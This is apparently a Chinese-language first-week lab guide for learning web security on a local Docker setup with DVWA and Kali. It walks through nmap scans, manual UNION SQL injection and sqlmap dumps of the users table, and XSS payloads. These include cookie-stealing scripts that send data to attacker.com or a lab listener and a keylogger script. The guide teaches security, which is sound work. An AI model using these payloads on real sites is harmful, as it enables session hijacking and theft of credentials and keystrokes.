# 第一周实践指南：从零开始

> 🎯 目标：搭建环境并完成第一个 Web 漏洞实践

## 📅 本周计划

- **Day 1-2**: 环境搭建与验证
- **Day 3-4**: DVWA SQL 注入入门
- **Day 5-6**: DVWA XSS 入门
- **Day 7**: 总结与复习

---

## Day 1: 环境搭建

### ✅ 任务清单

1. **确认 Docker 已安装**
   ```bash
   # 检查 Docker 版本
   docker --version
   docker-compose --version
   
   # 应该看到类似输出：
   # Docker version 24.0.x
   # Docker Compose version v2.x.x
   ```

2. **启动实验环境**
   ```bash
   # 进入目录
   cd d:/workspace/github/cybersecurity-doc/labs/docker-lab
   
   # Windows: 双击 start.bat
   # 或命令行运行
   start.bat
   
   # Linux/Mac
   ./start.sh
   ```

3. **验证环境**
   ```bash
   # 检查容器状态（所有服务应该是 "Up" 状态）
   docker-compose ps
   
   # 测试 DVWA 访问
   curl http://localhost:8080
   ```

### 🎯 预期结果

- [ ] Docker 运行正常
- [ ] 所有容器启动成功
- [ ] 浏览器能访问 http://localhost:8080
- [ ] 能用 admin/password 登录 DVWA

### 📝 笔记

记录遇到的问题和解决方法：

```
问题：
解决：
```

---

## Day 2: 熟悉工具

### ✅ 任务清单

1. **探索 DVWA**
   - 浏览器访问 http://localhost:8080
   - 使用 admin/password 登录
   - 点击 "Create / Reset Database"
   - 浏览所有漏洞模块，了解有哪些漏洞

2. **安装常用工具到 Kali**
   ```bash
   # 进入 Kali 容器
   docker exec -it kali-tools bash
   
   # 更新软件源
   apt update
   
   # 安装常用工具
   apt install -y nmap sqlmap dirb nikto curl wget
   
   # 测试 nmap
   nmap --version
   ```

3. **扫描靶机**
   ```bash
   # 在 Kali 容器中
   
   # 扫描 DVWA
   nmap -sV 172.20.0.10
   
   # 扫描 SQLi Labs
   nmap -sV 172.20.0.11
   
   # 退出容器
   exit
   ```

### 🎯 预期结果

- [ ] DVWA 数据库创建成功
- [ ] Kali 中工具安装成功
- [ ] 能用 nmap 扫描到靶机开放的端口

### 📝 笔记

```
nmap 扫描结果：
开放的端口：
运行的服务：
```

---

## Day 3: SQL 注入基础（低难度）

### ✅ 任务清单

1. **设置 DVWA 难度**
   - 登录 DVWA
   - 点击 "DVWA Security"
   - 选择 "low"
   - 点击 "Submit"

2. **手动测试 SQL 注入**
   - 点击 "SQL Injection"
   - 在输入框输入 `1`，点击 Submit
   - 观察正常输出
   
   - 输入 `'`，观察错误信息
   - 输入 `1' or '1'='1`，观察结果
   
   - 输入 `1' order by 1--+`，测试列数
   - 输入 `1' order by 2--+`
   - 输入 `1' order by 3--+`（应该报错）

3. **获取数据**
   ```sql
   -- 确定显示列
   1' union select 1,2--+
   
   -- 获取数据库版本
   1' union select 1,@@version--+
   
   -- 获取当前用户
   1' union select 1,user()--+
   
   -- 获取数据库名
   1' union select 1,database()--+
   
   -- 获取所有数据库
   1' union select 1,schema_name from information_schema.schemata--+
   
   -- 获取表名
   1' union select 1,table_name from information_schema.tables where table_schema='dvwa'--+
   
   -- 获取列名
   1' union select 1,column_name from information_schema.columns where table_name='users'--+
   
   -- 获取用户数据
   1' union select user,password from users--+
   ```

### 🎯 预期结果

- [ ] 能触发 SQL 注入错误
- [ ] 能使用 UNION 注入获取数据
- [ ] 成功获取数据库版本、用户名
- [ ] 成功获取所有用户和密码

### 📝 学习要点

1. **注入点判断**
   - 单引号 `'` 触发错误
   - `or '1'='1` 返回所有数据

2. **列数确定**
   - 使用 `order by` 递增测试
   - 报错时的数字就是列数

3. **UNION 注入**
   - 前面的查询必须为假（id=-1 或 id=999）
   - 显示的位置可以替换为 SQL 函数

### 🔍 深入理解

```sql
-- 原始 SQL 语句
SELECT first_name, last_name FROM users WHERE user_id = '$id';

-- 注入后的 SQL
SELECT first_name, last_name FROM users WHERE user_id = '1' union select 1,@@version--';
```

### 📝 笔记

```
成功获取的信息：
- 数据库版本：
- 当前用户：
- 数据库名：
- 用户表字段：
- 管理员密码哈希：
```

---

## Day 4: SQLMap 自动化

### ✅ 任务清单

1. **获取 DVWA Cookie**
   - 登录 DVWA
   - 打开浏览器开发者工具（F12）
   - 找到 Cookie 中的 `PHPSESSID` 和 `security`
   - 记录下来：`PHPSESSID=xxx; security=low`

2. **使用 SQLMap**
   ```bash
   # 进入 Kali 容器
   docker exec -it kali-tools bash
   
   # 基础探测
   sqlmap -u "http://172.20.0.10/vulnerabilities/sqli/?id=1&Submit=Submit" \
          --cookie="PHPSESSID=你的session; security=low" \
          --batch
   
   # 获取数据库
   sqlmap -u "http://172.20.0.10/vulnerabilities/sqli/?id=1&Submit=Submit" \
          --cookie="PHPSESSID=你的session; security=low" \
          --dbs \
          --batch
   
   # 获取表
   sqlmap -u "http://172.20.0.10/vulnerabilities/sqli/?id=1&Submit=Submit" \
          --cookie="PHPSESSID=你的session; security=low" \
          -D dvwa --tables \
          --batch
   
   # 获取列
   sqlmap -u "http://172.20.0.10/vulnerabilities/sqli/?id=1&Submit=Submit" \
          --cookie="PHPSESSID=你的session; security=low" \
          -D dvwa -T users --columns \
          --batch
   
   # 获取数据
   sqlmap -u "http://172.20.0.10/vulnerabilities/sqli/?id=1&Submit=Submit" \
          --cookie="PHPSESSID=你的session; security=low" \
          -D dvwa -T users -C user,password --dump \
          --batch
   ```

3. **对比手动与自动**
   - 记录 SQLMap 获取的信息
   - 对比 Day 3 手动注入的结果
   - 理解 SQLMap 的自动化原理

### 🎯 预期结果

- [ ] SQLMap 成功检测到注入点
- [ ] 成功获取数据库信息
- [ ] 成功导出用户数据
- [ ] 理解手动注入与自动化的区别

### 📝 对比总结

```
手动注入优点：
自动化优点：

学习建议：
```

---

## Day 5: XSS 基础（反射型）

### ✅ 任务清单

1. **设置 DVWA 难度为 Low**

2. **测试反射型 XSS**
   - 点击 "XSS reflected"
   - 输入正常文本，观察输出
   - 输入 `<script>alert('XSS')</script>`
   - 观察是否弹出警告框

3. **测试不同 Payload**
   ```html
   <!-- 基础测试 -->
   <script>alert('XSS')</script>
   
   <!-- 获取 Cookie -->
   <script>alert(document.cookie)</script>
   
   <!-- 图片标签 -->
   <img src=x onerror=alert('XSS')>
   
   <!-- 事件处理 -->
   <svg onload=alert('XSS')>
   
   <!-- JavaScript 伪协议 -->
   <a href="javascript:alert('XSS')">Click me</a>
   ```

4. **窃取 Cookie（模拟）**
   ```html
   <!-- 监听 Cookie（需要外部服务器） -->
   <script>
   new Image().src="http://attacker.com/cookie.php?c="+document.cookie;
   </script>
   ```

### 🎯 预期结果

- [ ] 成功触发 XSS 弹窗
- [ ] 能获取当前页面的 Cookie
- [ ] 理解反射型 XSS 的原理

### 📝 学习要点

1. **XSS 类型**
   - 反射型：恶意脚本来自 URL 参数
   - 存储型：恶意脚本存储在服务器
   - DOM 型：在客户端动态生成

2. **危害**
   - 窃取 Cookie
   - 劫持会话
   - 钓鱼攻击
   - 传播蠕虫

### 📝 笔记

```
成功的 Payload：
失败的 Payload：
原因分析：
```

---

## Day 6: XSS 进阶（存储型）

### ✅ 任务清单

1. **测试存储型 XSS**
   - 点击 "XSS stored"
   - 在 "Name" 和 "Message" 输入测试数据
   - 提交后观察是否永久保存
   - 尝试注入 XSS Payload

2. **绕过长度限制**
   - 观察输入框的 `maxlength` 属性
   - 使用浏览器开发者工具修改
   - 或直接使用 Burp Suite 拦截修改

3. **Payload 测试**
   ```html
   <!-- 存储型 XSS -->
   <script>alert('Stored XSS')</script>
   
   <!-- 窃取 Cookie -->
   <script>
   var img = new Image();
   img.src = "http://172.20.0.100:8888/?cookie=" + document.cookie;
   </script>
   
   <!-- 键盘记录 -->
   <script>
   document.onkeypress = function(e) {
     var xhr = new XMLHttpRequest();
     xhr.open("GET", "http://172.20.0.100:8888/?key=" + e.key, true);
     xhr.send();
   }
   </script>
   ```

4. **设置监听服务器**
   ```bash
   # 在 Kali 中启动监听
   docker exec -it kali-tools bash
   python3 -m http.server 8888
   
   # 或使用 nc
   nc -lvnp 8888
   ```

### 🎯 预期结果

- [ ] 成功注入存储型 XSS
- [ ] 理解反射型和存储型的区别
- [ ] 能设置简单的监听接收数据

### 📝 对比总结

```
反射型 XSS：
存储型 XSS：
危害对比：
```

---

## Day 7: 总结与复习

### ✅ 任务清单

1. **复习本周内容**
   - 回顾 SQL 注入的手动测试方法
   - 回顾 SQLMap 的使用
   - 回顾 XSS 的两种类型

2. **整理笔记**
   - 记录学到的知识点
   - 记录遇到的问题和解决方法
   - 记录常用的 Payload 和命令

3. **实践练习**
   - 尝试 DVWA 中难度
   - 不看教程，从头测试 SQL 注入
   - 不看教程，从头测试 XSS

4. **准备下周**
   - 预览 SQLi Labs
   - 了解更多注入类型

### 📝 本周总结

#### SQL 注入

**手工测试步骤：**
1.
2.
3.

**常用 Payload：**
```sql

```

**SQLMap 命令：**
```bash

```

#### XSS

**反射型 XSS：**
- 原理：
- 测试方法：

**存储型 XSS：**
- 原理：
- 测试方法：

**常用 Payload：**
```html

```

### 🎯 自我评估

- [ ] 能独立完成 SQL 注入手工测试
- [ ] 能熟练使用 SQLMap
- [ ] 能区分反射型和存储型 XSS
- [ ] 能构造基本的 XSS Payload
- [ ] 理解漏洞的危害和防护

### 📚 扩展阅读

1. OWASP Top 10
2. SQL 注入 Cheat Sheet
3. XSS Filter Evasion

---

## 🎉 完成奖励

恭喜完成第一周的学习！

**你已经掌握了：**
- Docker 环境搭建
- SQL 注入基础
- XSS 攻击基础
- 常用工具使用

**下一步：**
- Week 2: SQLi Labs 系统学习
- Week 3: 文件上传、命令执行
- Week 4: 综合靶机练习

---

## 💡 学习建议

1. **不要急于求成**
   - 每天专注完成当天的任务
   - 理解原理比记住 Payload 更重要

2. **多动手实践**
   - 理论学习后立即实践
   - 尝试不同的方法和 Payload

3. **记录笔记**
   - 记录成功的 Payload
   - 记录失败的原因
   - 定期复习总结

4. **参与社区**
   - 加入 CTF 群组
   - 分享学习心得
   - 向他人请教

**加油！网络安全的学习之路才刚刚开始！** 🚀
